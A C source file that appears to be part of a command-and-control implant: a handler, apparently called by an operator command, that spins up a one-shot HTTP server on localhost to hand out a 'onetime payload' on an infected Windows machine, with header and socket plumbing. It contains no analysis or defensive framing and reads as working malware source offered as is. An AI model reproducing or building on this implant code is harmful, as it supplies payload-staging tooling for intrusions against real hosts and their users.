#include <winsock2.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "channel.h"
#include "functions.h"
#include "jobs.h"
#include "parse.h"

extern int threadcount;

typedef struct {
	SOCKET socket;
	int    length;
	int    hlength;
	char * data;
	char * header;
	char * getit;
} serverdata;

serverdata * serverdata_build(SOCKET socket, char * data, int length) {
	serverdata * temp = (serverdata *)malloc(sizeof(serverdata)); /* TODO: temp memory cleaned up via serverdata_cleanup().  This is a short lived thread to to serve some onetime payload.*/
	temp->socket = socket;

	/* push our data into this server package */
	temp->data   = (char *)malloc(length);
	memcpy(temp->data, data, length);
	temp->length = length;

	/* allocate our header info too */
	temp->header = (char *)malloc(256);
	_snprintf(temp->header, 256, "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", temp->length);
	temp->hlength = strlen(temp->header);

	/* allocate our temporary buffer */
	temp->getit = (char *)malloc(2048);

	return temp;
}

void serverdata_cleanup(serverdata * temp) {
	closesocket(temp->socket);
	free(temp->data);
	free(temp->getit);
	free(temp->header);
	free(temp);
}

/* grab some stuff */
int recv_line(SOCKET MySock, char * buffer, int max) {
		unsigned int read = 0;
		int status = 0;

		while (read < max) {
				status = recv(MySock, buffer + read, 1, 0);
				if (status <= 0)
					return SOCKET_ERROR;

				/* should be 1 byte */
				read += status;

				/* we're good to go y0 */
				if (read >= 2 && buffer[read - 1] == '\n' && buffer[read - 2] == '\r') {
						buffer[read - 2] = '\0';
						return read;
				}
		}
		return SOCKET_ERROR;
}

/* spin up a one time use web server */
void serveit_thread(void * data) {
	serverdata * sdata = (serverdata *)data;
	SOCKET ClientSock = INVALID_SOCKET;
	int    nlen;

	/* accept the connection */
	ClientSock = accept(sdata->socket, NULL, NULL);

	if (ClientSock == INVALID_SOCKET) {
		serverdata_cleanup(sdata);
		threadcount--;
		return;
	}

	/* get some stuff */
	while ((nlen = recv_line(ClientSock, sdata->getit, 2048)) > 2) {
		/* keep reading! */
	}

	/* send it */
	send(ClientSock, sdata->header, sdata->hlength, 0);
	send(ClientSock, sdata->data, sdata->length, 0);

	/* clean up y0 */
	serverdata_cleanup(sdata);
	closesocket(ClientSock);

	/* decrement our threadcount */
	threadcount--;
}

void serveit(unsigned short port, char * data, int length) {
	serverdata * sdata;
	SOCKET ServerSock = INVALID_SOCKET;
	struct sockaddr_in sock;
	unsigned int status = 0;

	/* init winsock */
	channel_winsock_init();

	/* setup our socket */
	ServerSock = socket(AF_INET, SOCK_STREAM, 0);
	if (ServerSock == INVALID_SOCKET) {
		closesocket(ServerSock);
		return;
	}

	/* specify the host/port we want to bind to */
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	sock.sin_addr.s_addr = 0x0100007f;

	/* start our server */
	status = bind(ServerSock, (SOCKADDR*)&sock, sizeof(sock));
	if (status == SOCKET_ERROR) {
		closesocket(ServerSock);
		return;
	}

	/* listen for a connection... *pHEAR* */
	status = listen(ServerSock, 120);
	if (status == SOCKET_ERROR) {
		closesocket(ServerSock);
		return;
	}

	/* make our serverdata object */
	sdata = serverdata_build(ServerSock, data, length);

	run_thread_start(&serveit_thread, (LPVOID)sdata);  /* TODO: this handle that is returned is not Closed */
}

void command_webserver_local(char * buffer, int length) {
	datap parser;
	unsigned short port;
	char * mydata;
	int    mylen;

	data_init(&parser, buffer, length);
	port   = data_short(&parser);
	mydata = data_buffer(&parser);
	mylen  = data_length(&parser);

	serveit(port, mydata, mylen);
}